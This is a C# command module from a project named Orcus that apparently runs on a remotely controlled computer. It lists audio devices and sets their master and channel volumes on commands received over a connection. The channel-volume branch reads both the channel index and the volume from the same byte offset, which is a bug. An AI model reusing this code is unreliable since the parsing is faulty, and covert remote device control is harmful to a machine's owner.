using System;
using System.Collections.Generic;
using System.Linq;
using CSCore.CoreAudioAPI;
using CSCore.SoundOut;
using Orcus.Plugins;
using Orcus.Shared.Commands.AudioVolumeControl;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.AudioVolumeControl
{
    internal class AudioVolumeControlCommand : Command
    {
        private readonly List<string> _deviceList;
        private readonly object _listsLock = new object();

        public AudioVolumeControlCommand()
        {
            _deviceList = new List<string>();
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            AudioEndpointVolume audioEndpointVolume;
            MMDevice mmDevice;

            switch ((AudioVolumeControlCommunication) parameter[0])
            {
                case AudioVolumeControlCommunication.GetDevices:
                    if (!WasapiOut.IsSupportedOnCurrentPlatform)
                    {
                        ResponseByte((byte) AudioVolumeControlCommunication.ResponseNotSupported, connectionInfo);
                        return;
                    }
                    var result = new List<AudioDevice>();
                    MMDeviceEnumerator mmDeviceEnumerator;
                    using (mmDeviceEnumerator = new MMDeviceEnumerator())
                    {
                        var defaultCaptureAudioEndpoint = mmDeviceEnumerator.GetDefaultAudioEndpoint(DataFlow.Capture,
                            Role.Communications);
                        var defaultRenderAudioEndpoint = mmDeviceEnumerator.GetDefaultAudioEndpoint(DataFlow.Render,
                            Role.Multimedia);

                        using (
                            var mmDeviceCollection = mmDeviceEnumerator.EnumAudioEndpoints(DataFlow.Capture,
                                DeviceState.Active))
                            result.AddRange(
                                GetAudioDevices(mmDeviceCollection, defaultCaptureAudioEndpoint.DeviceID,
                                    AudioEndpointType.Capture));

                        using (
                            var mmDeviceCollection = mmDeviceEnumerator.EnumAudioEndpoints(DataFlow.Render,
                                DeviceState.Active))
                            result.AddRange(
                                GetAudioDevices(mmDeviceCollection, defaultRenderAudioEndpoint.DeviceID,
                                    AudioEndpointType.Render));

                        defaultRenderAudioEndpoint.Dispose();
                        defaultCaptureAudioEndpoint.Dispose();

                        var serializer = new Serializer(typeof (List<AudioDevice>));
                        ResponseBytes((byte) AudioVolumeControlCommunication.ResponseDevices,
                            serializer.Serialize(result),
                            connectionInfo);
                    }
                    break;
                case AudioVolumeControlCommunication.SetDeviceMasterVolume:
                    lock (_listsLock)
                    {
                        mmDevice = GetAudioDevice(_deviceList[BitConverter.ToInt32(parameter, 1)]);
                    }

                    if (mmDevice == null)
                    {
                        ResponseByte((byte) AudioVolumeControlCommunication.ResponseDeviceNotFound, connectionInfo);
                        return;
                    }
                    var newVolume = BitConverter.ToSingle(parameter, 5);

                    using (audioEndpointVolume = AudioEndpointVolume.FromDevice(mmDevice))
                        audioEndpointVolume.MasterVolumeLevelScalar = newVolume;
                    ResponseByte((byte) AudioVolumeControlCommunication.ResponseVolumeSet, connectionInfo);
                    break;
                case AudioVolumeControlCommunication.SetDeviceChannelVolume:
                    lock (_listsLock)
                    {
                        mmDevice = GetAudioDevice(_deviceList[BitConverter.ToInt32(parameter, 1)]);
                    }

                    if (mmDevice == null)
                    {
                        ResponseByte((byte) AudioVolumeControlCommunication.ResponseDeviceNotFound, connectionInfo);
                        return;
                    }

                    using (audioEndpointVolume = AudioEndpointVolume.FromDevice(mmDevice))
                    {
                        var channelIndex = BitConverter.ToInt32(parameter, 5);
                        var channel =
                            audioEndpointVolume.Channels.FirstOrDefault(x => x.ChannelIndex == channelIndex);
                        if (channel == null)
                        {
                            ResponseByte((byte) AudioVolumeControlCommunication.ResponseChannelNotFound,
                                connectionInfo);
                            return;
                        }
                        channel.VolumeScalar = BitConverter.ToSingle(parameter, 5);
                        ResponseByte((byte) AudioVolumeControlCommunication.ResponseVolumeSet, connectionInfo);
                    }

                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private IEnumerable<AudioDevice> GetAudioDevices(MMDeviceCollection mmDeviceCollection, string defaultDeviceId,
            AudioEndpointType audioEndpointType)
        {
            lock (_listsLock)
            {
                foreach (var device in mmDeviceCollection)
                {
                    var audioEndpointVolume = AudioEndpointVolume.FromDevice(device);
                    int id;
                    if (_deviceList.Contains(device.DeviceID))
                    {
                        id = _deviceList.IndexOf(device.DeviceID);
                    }
                    else
                    {
                        id = _deviceList.Count;
                        _deviceList.Add(device.DeviceID);
                    }

                    using (audioEndpointVolume)
                    using (device)
                        yield return
                            new AudioDevice
                            {
                                DeviceId = id,
                                Name = device.FriendlyName,
                                IsDefault = device.DeviceID == defaultDeviceId,
                                CurrentVolume = audioEndpointVolume.MasterVolumeLevelScalar,
                                AudioEndpointType = audioEndpointType,
                                AudioChannels =
                                    audioEndpointVolume.Channels.Select(
                                        x => new AudioChannel {ChannelIndex = x.ChannelIndex, Volume = x.VolumeScalar})
                                        .ToList()
                            };
                }
            }
        }

        private MMDevice GetAudioDevice(string deviceId)
        {
            using (var mmDeviceEnumerator = new MMDeviceEnumerator())
            {
                return
                    mmDeviceEnumerator.EnumAudioEndpoints(DataFlow.All, DeviceState.Active)
                        .FirstOrDefault(x => x.DeviceID == deviceId);
            }
        }

        protected override uint GetId()
        {
            return 2;
        }
    }
}